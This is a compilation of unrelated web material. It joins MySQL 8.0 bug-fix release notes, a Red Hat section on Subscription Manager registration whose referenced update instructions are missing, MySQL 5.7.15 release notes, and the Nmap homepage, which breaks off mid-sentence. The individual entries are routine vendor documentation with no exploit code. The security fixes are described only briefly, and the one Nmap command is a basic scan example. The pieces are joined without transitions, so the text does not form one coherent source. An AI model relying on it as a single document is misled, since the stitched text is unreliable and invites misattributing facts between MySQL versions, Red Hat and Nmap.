* A race condition between [`UNINSTALL
  PLUGIN`](/doc/refman/8.0/en/uninstall-plugin.html) and [`SHOW PLUGINS`](/doc/refman/8.0/en/show-plugins.html)
  could result in a server exit.
  (Bug #24344026)
* With `ROW` mode binary logging, component
  installation raised an assertion.
  (Bug #24343582)
* A potential memory leak related to roles was fixed.
  (Bug #24337928)
* Subqueries that were converted to semijoins and programmatically
  generated an `INFORMATION_SCHEMA` table could
  incorrectly treat the `INFORMATION_SCHEMA`
  table as empty.

  A workaround for this problem prior to the bug fix: `SET
  optimizer_switch='semijoin=off';`
  (Bug #24287772, Bug #82214)
* **mysqldumpslow** failed to parse timestamps in
  the slow query log; it had not been updated to track a change in
  log timestamp format.
  (Bug #24007040)
* The AppArmor profile installed by Ubuntu packages was missing an
  entry permitting `libnuma` to read a
  `/sys` hierarchy path, resulting in server
  startup failure.
  (Bug #23854929)
* The optimizer could incorrectly treat
  [`RAND()`](/doc/refman/8.0/en/mathematical-functions.html#function_rand) as a constant for queries
  subjected to semijoin transformation.
  (Bug #23854015)
* For debug builds, unequal-length binary operands for bit
  operators could raise an assertion.
  (Bug #23853628)
* If a transaction rollback request rolled back only a statement
  and not the whole transaction, any attempt at attaching another
  operation to the transaction raised an assertion.
  (Bug #23753319, Bug #82143)
* [`STRCMP()`](/doc/refman/8.0/en/string-comparison-functions.html#function_strcmp) for arguments with the
  `utf8mb4_unicode_ci` collation could return
  results different from `ORDER BY`.
  [`STRCMP()`](/doc/refman/8.0/en/string-comparison-functions.html#function_strcmp) has been corrected.
  (Bug #23752284, Bug #82132)
* Complete logical backups made with **mysqlpump**
  could not be restored if GTIDs were enabled.

  To enable control over GTID information written to the dump
  file, **mysqlpump** now has a
  [`--set-gtid-purged`](/doc/refman/8.0/en/mysqlpump.html#option_mysqlpump_set-gtid-purged) option that
  indicates whether to add a
  [`SET`](/doc/refman/8.0/en/set-variable.html)
  `@@GLOBAL.`[`gtid_purged`](/doc/refman/8.0/en/replication-options-gtids.html#sysvar_gtid_purged)
  statement to the output.
  (Bug #23748432)
* Infinite recursion could occur if the
  `audit_log` plugin signalled an error while
  handling an error.
  (Bug #23717558, Bug #82052)
* Messages written by the `audit_log` plugin to
  the error log regarding `MYSQL_AUDIT_CONNECT`
  event failures now print the underlying error cause as well to
  aid debugging.
  (Bug #23710632)
* MySQL now uses `readdir()` rather than
  `readdir_r()`. The latter has been deprecated
  since `glibc` 2.24 and caused debug builds of
  MySQL and builds using GCC 6.1 to fail.

  Additionally, several problems resulting in GCC 6.1 compiler
  warnings were corrected.
  (Bug #23708395, Bug #24437737, Bug #82515, Bug #24459890, Bug #82583, Bug #25103242)
* `FORCE INDEX` was ineffective for
  `SELECT COUNT(*)` queries.
  (Bug #23596760, Bug #81854)
* During startup, the server creates a lock file for the Unix
  socket file (for example, `mysql.sock.lock`
  as a lock file for `mysql.sock`). If the
  server failed to write the process ID to the lock file, it
  failed to remove that file, which could cause subsequent server
  startups to fail until the file was removed manually.
  (Bug #23582603, Bug #81838)
* For debug builds, queries executed using
  `Item_func_spatial_collection::val_str()` could
  raise an assertion.
  (Bug #23573720)
* For audit log events in the connection class, the
  `connection_type` value was available only for
  connect events. The value is now available in connect,
  disconnect, and change-user events.
  (Bug #23541550)
* The `audit_log` plugin
  `audit_log_filter_remove_filter()` function
  caused a server exit if given a `NULL`
  argument.
  (Bug #23522793)
* Attempts to configure MySQL without the
  [`FEDERATED`](/doc/refman/8.0/en/federated-storage-engine.html) storage engine failed
  (the **CMake**
  `-DWITH_FEDERATED_STORAGE_ENGINE=0` option did
  not work).
  (Bug #23508203, Bug #81665)
* On Solaris, `gettimeofday()` could return an
  invalid value and cause a server shutdown.
  (Bug #23499695)
* The `keyring_file` plugin could attempt to
  write keys to its storage file when the file did not exist. To
  ensure that keys are flushed only when the correct storage file
  exists, `keyring_file` now stores a SHA-256
  checksum of the keyring in the file. Before updating the file,
  the plugin verifies that it contains the expected checksum.
  (Bug #23498254)
* A union query resulting in tuples larger than
  [`max_join_size`](/doc/refman/8.0/en/server-system-variables.html#sysvar_max_join_size) could result in a
  server exit.
  (Bug #23303485)
* Grant tables with incorrect structure may cause problems in user
  management operations. As a consequence of the fix for this, for
  any operation that modifies a grant table, the server now checks
  whether the table has the expected structure and produces an
  error if not. **mysql\_upgrade** must be run to
  update the tables to the expected structure.
  (Bug #23295423, Bug #25095876, Bug #25448037)
* [`ST_ExteriorRing()`](/doc/refman/8.0/en/gis-polygon-property-functions.html#function_st-exteriorring) could cause a
  server exit due to being passed an invalid WKB string believed
  to be valid.
  (Bug #23280574)
* For debug builds, failure to prepare a branch of an XA
  transaction could lead to a server exit.
  (Bug #23264552, Bug #81375)
* The optimizer could choose
  [`ref`](/doc/refman/8.0/en/explain-output.html#jointype_ref) access on a secondary
  index rather than [`range`](/doc/refman/8.0/en/explain-output.html#jointype_range)
  access on the primary key, even when the cost was higher.
  (Bug #23259872, Bug #81341)
* An instance of the disk-full error message contained the wrong
  error code.
  (Bug #23247332, Bug #81346)
* For a query with `ORDER BY` and
  `LIMIT`, an optimizer trace did not record the
  optimizer's switch to a different index.
  (Bug #23227428, Bug #81250)
* Improper handling of a lock used by the
  `version_tokens` plugin and functions could
  result in a server exit if one of the functions was called while
  `version_tokens` was being uninstalled.
  (Bug #23210850)
* Certain errors in DML statements executed within stored programs
  could be mishandled and result in a server exit.
  (Bug #23209989)
* The [`QUOTE()`](/doc/refman/8.0/en/string-functions.html#function_quote) function could
  allocate excessive memory. A limit of
  [`max_allowed_packet`](/doc/refman/8.0/en/server-system-variables.html#sysvar_max_allowed_packet) bytes is now
  imposed and returns `NULL` with a warning for
  attempts to allocate more.
  (Bug #23195404)
* For some deeply nested expressions, the optimizer failed to
  detect stack overflow, resulting in a server exit.
  (Bug #23135667)
* For sessions created through the X Plugin, incorrect thread
  attachment/detachment could cause a server exit.
  (Bug #23057045)
* When attempting to locate the data directory,
  **mysqld\_safe** incorrectly considered
  `$MY_BASEDIR_VERSION/var` as one of the
  possible locations.
  (Bug #23013510, Bug #80866)
* For some generated columns, character set conversion of the
  column definition for table rebuilds could change column values.
  (Bug #22991924)
* The OS X DMG installer did not properly set up keyring plugin
  installation.
  (Bug #22991650)
* If a query performed a `GROUP BY` on a column
  of a derived table and the select list contained an expression
  mixing an aggregate function and the group column, an error was
  raised if the
  [`ONLY_FULL_GROUP_BY`](/doc/refman/8.0/en/sql-mode.html#sqlmode_only_full_group_by) SQL mode
  was enabled.
  (Bug #22924183, Bug #80726)
* A binary (in-place) upgrade from MySQL 5.6 to 5.7 followed by a
  data export performed using **mysqlpump**
  resulted in an `Invalid default value for
  date_column` error for
  attempts to reload the dump file.
  (Bug #22919028, Bug #80706)
* A failed cast of a long float to integer could cause a server
  exit.
  (Bug #22907691)
* On Unix and Unix-like systems, the error log file resulting from
  specifying [`--log-error`](/doc/refman/8.0/en/server-options.html#option_mysqld_log-error) without an
  option value was incorrectly created in the directory of the PID
  file if the [`--pid-file`](/doc/refman/8.0/en/server-system-variables.html#sysvar_pid_file) option was
  also given.
  (Bug #22900354)
* The `main.log_tables-big` test case could be
  unstable on highly loaded hosts. Thanks to Laurynas Biveinis for
  the patch.
  (Bug #22874167, Bug #80607)
* SQL statements executed through the X Plugin were not
  instrumented in the Performance Schema.
  (Bug #22859462)
* The `rpl.rpl_key_rotation` test case did not
  synchronize properly with the master server. Thanks to Laurynas
  Biveinis for the patch.
  (Bug #22838596, Bug #80531)
* [`DROP INDEX`](/doc/refman/8.0/en/drop-index.html) operations could fail
  due to inconsistent handling of index prefix lengths for
  [`TEXT`](/doc/refman/8.0/en/blob.html)-type columns
  ([`TINYTEXT`](/doc/refman/8.0/en/blob.html) and so forth).

  A consequence of this fix is more restrictive behavior for
  [`CREATE TABLE`](/doc/refman/8.0/en/create-table.html) and
  [`CREATE INDEX`](/doc/refman/8.0/en/create-index.html) statements for which
  a specified index prefix exceeds the maximum column data type
  size:

  + For a nonunique index, either an error occurs (if strict SQL
    mode is enabled), or the index length is reduced to lie
    within the maximum column data type size and a warning is
    produced (if strict mode is not enabled).
  + For a unique index, an error occurs regardless of SQL mode
    because reducing the index length might enable insertion of
    nonunique entries that do not meet the specified uniqueness
    requirement.

  (Bug #22740093, Bug #80392)
* Metadata locking on stored routine names was performed on a
  case-sensitive basis, but routine names are not case sensitive.
  (Bug #22700385)
* Queries that used an aggregate function with
  `DISTINCT` could produce incorrect results.
  (Bug #22686994, Bug #80310)
* The [`innodb_numa_interleave`](/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_numa_interleave)
  system variable was erroneously available on some systems that
  were not NUMA-enabled. Thanks to Tomislav Plavcic for the patch.

  **CMake** now sets the default
  [`WITH_NUMA`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_with_numa) value based on whether
  the current platform has `NUMA` support. For
  platforms without NUMA support, **CMake** behaves
  as follows:

  + With no NUMA option (the normal case),
    **CMake** continues normally, producing only
    this warning: NUMA library missing or required version not
    available
  + With [`-DWITH_NUMA=ON`](/doc/refman/8.0/en/source-configuration-options.html#option_cmake_with_numa),
    **CMake** aborts with this error: NUMA
    library missing or required version not available

  (Bug #22678436, Bug #80288)
* Certain SQL queries involving complex `WHERE`
  conditions could cause warnings, memory corruption, or a server
  exit.
  (Bug #22671573)
* When taking the server offline, a race condition within the
  Performance Schema could lead to a server exit.
  (Bug #22551677)
* On macOS, if a table with an associated trigger was renamed to a
  new name containing both lowercase and uppercase characters,
  [`DROP TRIGGER`](/doc/refman/8.0/en/drop-trigger.html) for the trigger
  resulted in an [`ER_NO_SUCH_TABLE`](/doc/mysql-errors/8.0/en/server-error-reference.html#error_er_no_such_table)
  error for the table.
  (Bug #22512899, Bug #79873)
* In the `MYSQL_FIELD` C API structure, the
  `org_table` value for derived tables was
  `*`, which could cause failure for queries that
  depend on this value. The `org_table` value for
  views and derived tables now is set as follows: If the column is
  selected from a view, `org_table` names the
  view. If the column is selected from a derived table,
  `org_table` names the base table. If a derived
  table wraps a view, `org_table` still names the
  base table. If the column is an expression,
  `org_table` is the empty string.
  (Bug #22364401, Bug #79641)
* For RPM packages, the default `error-log`
  location in the deployed `/etc/my.cnf` file
  differed from the location in the installed
  **logrotate** script, causing
  **logrotate** to fail.
  (Bug #22322685)
* The Performance Schema
  [`events_statements_summary_by_digest`](/doc/refman/8.0/en/performance-schema-statement-summary-tables.html)
  table could contain multiple rows for the same statement digest
  and schema combination, rather than the expected single (unique)
  row.
  (Bug #22320066, Bug #79533)
* For Performance Schema system and status variable tables,
  variable values expressed in a character set different from
  `utf8` could be truncated or incorrect.
  (Bug #22313205)
* For debug builds, altering a table partitioning expression using
  an expression attribute with an invalid UTF-8 name caused an
  assertion to be raised.
  (Bug #22152229)
* After performing inserts in a table containing an
  `AUTO_INCREMENT` column and then performing a
  [`SELECT`](/doc/refman/8.0/en/select.html) operation, the
  [`LAST_INSERT_ID()`](/doc/refman/8.0/en/information-functions.html#function_last-insert-id) returns the
  correct value, but the value of the
  [`mysql_insert_id()`](/doc/c-api/8.0/en/mysql-insert-id.html) C API function
  was being reset to 0.
  (Bug #22028117, Bug #78778)
* On Ubuntu, error messages were displayed during upgrades from
  Community to Commercial packages that made it appear as though
  **mysqld** and
  **my\_print\_defaults** had not been installed.
  Those messages were spurious and have been silenced.
  (Bug #21807248)
* With the [`use_index_extensions`](/doc/refman/8.0/en/switchable-optimizations.html#optflag_use-index-extensions)
  flag of the [`optimizer_switch`](/doc/refman/8.0/en/server-system-variables.html#sysvar_optimizer_switch)
  system variable disabled, some `SELECT
  DISTINCT` queries could return incorrect results.
  (Bug #21749123, Bug #78244)
* An invalid string value in the `WHERE` clause
  of an `UPDATE` statement, caused an index scan
  rather than a range scan to be used. For values not present in
  the index, this could be much slower. Now the optimizer
  determines this to be an “impossible
  `WHERE`” condition.
  (Bug #21032418, Bug #76933)
* Debian packages were missing an AppArmor-related include file
  and incorrectly were marked dependent on AppArmor (making it
  impossible to disable AppArmor by uninstalling it).
  (Bug #20768958)
* When the
  [`automatic_sp_privileges`](/doc/refman/8.0/en/server-system-variables.html#sysvar_automatic_sp_privileges) system
  variable was enabled, it did not have the expected effect for
  anonymous users.
  (Bug #20266641)
* In a replication environment, [`SET
  PASSWORD`](/doc/refman/8.0/en/set-password.html) or [`ALTER USER`](/doc/refman/8.0/en/alter-user.html)
  could fail to execute on the slave due to failure to parse the
  hash string correctly.
  (Bug #20228478)
* The optimizer `resolve_const_item()` function
  called `Item_decimal()` with the last two
  arguments in the wrong order.
  (Bug #19062566)
* An in-place [`ALTER TABLE`](/doc/refman/8.0/en/alter-table.html) operation
  failed to report an error when adding a `DATE`
  or `DATETIME` column under these conditions: a)
  the column was `NOT NULL` and no default value
  was supplied; b) strict and `NO_ZERO_DATE` SQL
  modes were enabled; c) the table was not empty.

  An [`ALTER TABLE`](/doc/refman/8.0/en/alter-table.html) operation failed
  with an error rather than a warning when adding a
  `DATE` or `DATETIME` column
  under these conditions: a) the column was `NOT
  NULL` and no default value was supplied; b) strict SQL
  mode was enabled and `NO_ZERO_DATE` SQL mode
  was not enabled; c) the table was not empty.
  (Bug #16888677)
* Inserting a [`TIME`](/doc/refman/8.0/en/time.html),
  [`DATE`](/doc/refman/8.0/en/datetime.html), or
  [`TIMESTAMP`](/doc/refman/8.0/en/datetime.html) value with a fractional
  seconds part into a column having the same type but fewer
  fractional digits resulted in rounding. This differs from MySQL
  5.5, which used truncation rather than rounding. To enable
  control over this behavior, a new
  [`TIME_TRUNCATE_FRACTIONAL`](/doc/refman/8.0/en/sql-mode.html#sqlmode_time_truncate_fractional) SQL
  mode is available. The default is to use rounding. If this mode
  is enabled, truncation occurs instead.
  (Bug #16583910, Bug #68760)
* `NOT IN` subqueries could produce incorrect
  results when an index prefix of an inner table was used.
  (Bug #13915291)
* On non-Linux Unix systems, the **mysql.server**
  startup script used the Linux command **pidof**
  rather than **pgrep**.
  (Bug #13788154, Bug #64342)
* Starting multiple instances of **mysqld\_safe**
  after an abnormal server exit could result in one
  **mysqld\_safe** instance killing another. As a
  consequence of the bug fix, the
  `mysqld_safe.pid` file is no longer used.
  (Bug #11751149, Bug #41908)
* The [`--help`](/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_help) message for
  **mysqld\_safe** was corrected to mention that the
  [`--no-defaults`](/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_no-defaults),
  [`--defaults-file`](/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_defaults-file), and
  [`--defaults-extra-file`](/doc/refman/8.0/en/mysqld-safe.html#option_mysqld_safe_defaults-extra-file)
  options, if given, must be the first argument.
  (Bug #11745176, Bug #11192)
* The bounds check for the XML parser position stack for each
  level (which has a fixed depth) used the size of the array as
  the upper limit, and so was off by one. This is fixed by
  decreasing the allowable depth by one, which actually matches
  the maximum number of elements in the position stack.
  (Bug #83871, Bug #25111907)

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

Access the Subscription Management GUI client in Red Hat Enterprise Linux 9 via **Activities** and then **Show Applications** which is visible in the Favorites dock by default.

Access the Subscription Management GUI client in Red Hat Enterprise Linux 8 via **Activities**, then select **Show Applications** and click **All**. Then select **Red Hat Subscription Manager**.

In Red Hat Enterprise Linux 7 open **Applications** -> **System Tools** -> **Red Hat Subscription Manager** and in Red Hat Enterprise Linux 6 via **System** -> **Administration** -> **Red Hat Subscription Manager**.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.

## Changes in MySQL 5.7.15 (2016-09-06, General Availability)

* [Security Notes](news-5-7-15.html#mysqld-5-7-15-security "Security Notes")
* [Test Suite Notes](news-5-7-15.html#mysqld-5-7-15-test-suite "Test Suite Notes")
* [Functionality Added or Changed](news-5-7-15.html#mysqld-5-7-15-feature "Functionality Added or Changed")
* [Bugs Fixed](news-5-7-15.html#mysqld-5-7-15-bug "Bugs Fixed")

### Security Notes

* The `validate_password` plugin now supports the
  capability of rejecting passwords that match the current session
  user name, either forward or in reverse. To enable control over
  this capability, the plugin exposes a
  [`validate_password_check_user_name`](/doc/refman/5.7/en/validate-password-options-variables.html#sysvar_validate_password_check_user_name)
  system variable. By default, this variable is disabled; the
  default will change to enabled in MySQL 8.0. For more
  information, see
  [Password Validation Plugin Options and Variables](/doc/refman/5.7/en/validate-password-options-variables.html).
  (WL #9480)

### Test Suite Notes

* In **mysql-test-run.pl**, a limit of 50 was
  imposed on the number of workers for parallel testing, which on
  systems with more than 50 CPUs resulted in exhaustion of unique
  thread IDs. The ID-exhaustion problem has been corrected, and
  the limit of 50 on number of workers has been lifted. Thanks to
  Daniel Black for the patch on which this change was based.
  Additionally, these changes were made:

  + To avoid idle workers, the number of parallel workers now is
    limited to the number of tests.
  + Previously, if `--parallel=auto` was given
    and the `MTR_MAX_PARALLEL` environment
    variable was not set, a limit of 8 was imposed on the number
    of parallel workers. This limit has been lifted.

  (Bug #22342399, Bug #79585)

### Functionality Added or Changed

* **InnoDB:**
  A new dynamic configuration option,
  [`innodb_deadlock_detect`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_deadlock_detect), may be
  used to disable deadlock detection. On high concurrency systems,
  deadlock detection can cause a slowdown when numerous threads
  wait for the same lock. At times, it may be more efficient to
  disable deadlock detection and rely on the
  [`innodb_lock_wait_timeout`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_lock_wait_timeout)
  setting for transaction rollback when a deadlock occurs.
  (Bug #23477773, WL #9383)
* The systemd support script for the unit file
  (`mysqld_pre_systemd`) now assists in
  creating the error log file only if its location matches the
  pattern /var/log/mysql\*.log. In other cases, the error log
  directory must be writable or the error log must be present and
  writable for the user running the **mysqld**
  process. Also, `mysqld_pre_systemd` now
  avoids creating insecure temporary files.
  (Bug #24516262)
* The **CMake**
  [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) option has been added to
  control which LZ4 library is used during compilation. By default
  [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) is set to
  `bundled`, so the library provided with MySQL
  is used. Setting [`WITH_LZ4`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4) to
  `system` uses the LZ4 library from the
  operating system.
  (Bug #23607230)

### Bugs Fixed

* **InnoDB:**
  An [`ALTER TABLE ...
  ENCRYPTION='Y', ALGORITHM=COPY`](/doc/refman/5.7/en/alter-table.html) operation on a table
  residing in the system tablespace raised an assertion.
  (Bug #24381804)
* **InnoDB:**
  Creating an encrypted table on a Fusion-io disk with an
  [`innodb_flush_method`](/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_flush_method) setting of
  `O_DIRECT` caused a fatal error.
  (Bug #24329079, Bug #82073)
* **InnoDB:**
  An operation that dropped and created a full-text search table
  raised an assertion.
  (Bug #24315031)
* **InnoDB:**
  Accessing full-text search auxiliary tables while dropping the
  indexed table raised an assertion.
  (Bug #24009272)
* **InnoDB:**
  An online DDL operation on a table with indexed
  [`BLOB`](/doc/refman/5.7/en/blob.html) columns raised an assertion
  during logging of table modifications.
  (Bug #23760086)
* **InnoDB:**
  In some cases, code that locates a buffer pool chunk
  corresponding to given pointer returned the wrong chunk. Thanks
  to Alexey Kopytov for the patch.
  (Bug #23631471, Bug #79378)
* **InnoDB:**
  A global counter (`ut_rnd_ulint_counter`) was
  changed to a thread-local counter to make it scalable on
  multi-core systems.
  (Bug #22733635, Bug #80354)
* **Replication:**
  The addition of the
  [`transaction-write-set-extraction=XXH64`](/doc/refman/5.7/en/replication-options-binary-log.html#sysvar_transaction_write_set_extraction)
  option uses xxHash symbols from liblz4. Although the xxHash
  symbols are exported by liblz4, the header file is not part of
  the API, so compilation failed when building with
  [`WITH_LZ4=system`](/doc/refman/5.7/en/source-configuration-options.html#option_cmake_with_lz4). The fix ensures
  that xxHash is built separately from liblz4 so that it is
  available both when using the system and bundled LZ4 libraries.
  (Bug #82426, Bug #24399819)

  References: See also: Bug #23607230.
* **Replication:**
  **mysqlbinlog --read-from-remote-server log1
  log2** was opening a new connection for
  `log2` without freeing the connection used for
  `log1`. Thanks to Laurynas Biveinis for the
  contribution.
  (Bug #81675, Bug #23540182)
* **Replication:**
  The MTR binary log test suite failed to clean up copied files.
  Thanks to Daniel Black for the contribution.
  (Bug #80881, Bug #23016254)
* **Replication:**
  With [`binlog_row_image=FULL`](/doc/refman/5.7/en/replication-options-binary-log.html#sysvar_binlog_row_image),
  when updating single tables temporary tables were unnecessarily
  being used. The fix ensures single table update follows the same
  pattern as multi-table update.
  (Bug #79867, Bug #22510353)
* **Solaris:**
  The client library failed to build on Solaris using the
  `Cstd` library.
  (Bug #24353920, Bug #82347)
* **mysqld\_safe** attempted to read
  `my.cnf` in the data directory, although that
  is no longer a standard option file location.
  (Bug #24482156)
* For **mysqld\_safe**, the argument to
  [`--malloc-lib`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_malloc-lib) now must be one
  of the directories `/usr/lib`,
  `/usr/lib64`,
  `/usr/lib/i386-linux-gnu`, or
  `/usr/lib/x86_64-linux-gnu`. In addition, the
  [`--mysqld`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_mysqld) and
  [`--mysqld-version`](/doc/refman/5.7/en/mysqld-safe.html#option_mysqld_safe_mysqld-version) options are
  accepted only on the command line, not in option files.
  (Bug #24464380)

  References: See also: Bug #24619033, Bug #82920.
* It was possible to write log files ending with
  `.ini` or `.cnf` that
  later could be parsed as option files. The general query log and
  slow query log can no longer be written to a file ending with
  `.ini` or `.cnf`.
  (Bug #24388753)
* Privilege escalation was possible by exploiting the way
  [`REPAIR TABLE`](/doc/refman/5.7/en/repair-table.html) used temporary
  files.
  (Bug #24388746)
* If the `basedir` system variable was set at
  server startup from the command line or option file, the value
  was not normalized (on Windows, `/` was not
  replaced with `\`).
  (Bug #23747899, Bug #82125)
* kevent statement timer subsystem deinitialization was revised to
  avoid a **mysqld** hang during shutdown on OS X
  10.12.
  (Bug #23744004, Bug #82097)
* For accounts for which multiple
  [`GRANT`](/doc/refman/5.7/en/grant.html) statements applied,
  **mysqlpump** could fail to dump them all.
  (Bug #23721446)
* The `MYSQL_ADD_PLUGIN` macro had a spelling
  error that caused `MYSQL_SERVER` not to be
  defined.
  (Bug #23508762, Bug #81666)
* In-place [`ALTER TABLE`](/doc/refman/5.7/en/alter-table.html) operations
  which when executed separately caused no table rebuild could
  when combined into a single statement result in a table rebuild.
  (Bug #23475211, Bug #81587)
* For keyring plugins, the data access layer is now created only
  as necessary, not once per operation, which improves keyring
  performance.
  (Bug #23337926)
* A blank server name in [`CREATE
  SERVER`](/doc/refman/5.7/en/create-server.html) statements produced a server exit rather than
  an error.
  (Bug #23295288)
* The optimizer failed to check a function return value for an
  area calculation, leading to a server exit.
  (Bug #23280059)
* The server could fail to free memory allocated for execution of
  queries that used generated columns.
  (Bug #23205454)

  References: This issue is a regression of: Bug #22392268.
* **mysqlpump** output for triggers that contained
  multiple statements in the trigger body failed to load
  correctly.
  (Bug #23072245)
* Queries that satisfied the following conditions could return
  different results than in MySQL 5.6: 1) A subquery appeared in
  the select list; 2) The subquery contained a
  `WHERE` condition that referenced a value in
  the outer query; 3) The outer query contained a `GROUP
  BY` that required creation of a temporary table.
  (Bug #23049975)
* Passwords that were rejected by the
  `validate_password` plugin were written by the
  server to the error log as cleartext.
  (Bug #22922023)
* A prepared statement that used a parameter in the select list of
  a derived table that was part of a join could cause a server
  exit.
  (Bug #22392374, Bug #24380263)
* [`MEDIUMINT`](/doc/refman/5.7/en/integer-types.html) columns used in
  operations with long integer values could result in buffer
  overflow.
  (Bug #19984392)
* A spurious [`ER_NO_SUCH_TABLE`](/doc/mysql-errors/5.7/en/server-error-reference.html#error_er_no_such_table)
  error could occur when attempting to execute a prepared
  `CREATE TABLE ... SELECT` statement that used a
  temporary table in the `FROM` clause and called
  a stored function. The same error could occur for a nonprepared
  version of the statement if used in a stored procedure when the
  procedure was re-executed.
  (Bug #16672723, Bug #68972)
* `EINTR` handling in the client library has been
  fixed so that interrupted read and write calls are retried.
  Previously, `EINTR` was ignored.
  (Bug #82019, Bug #23703570)

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
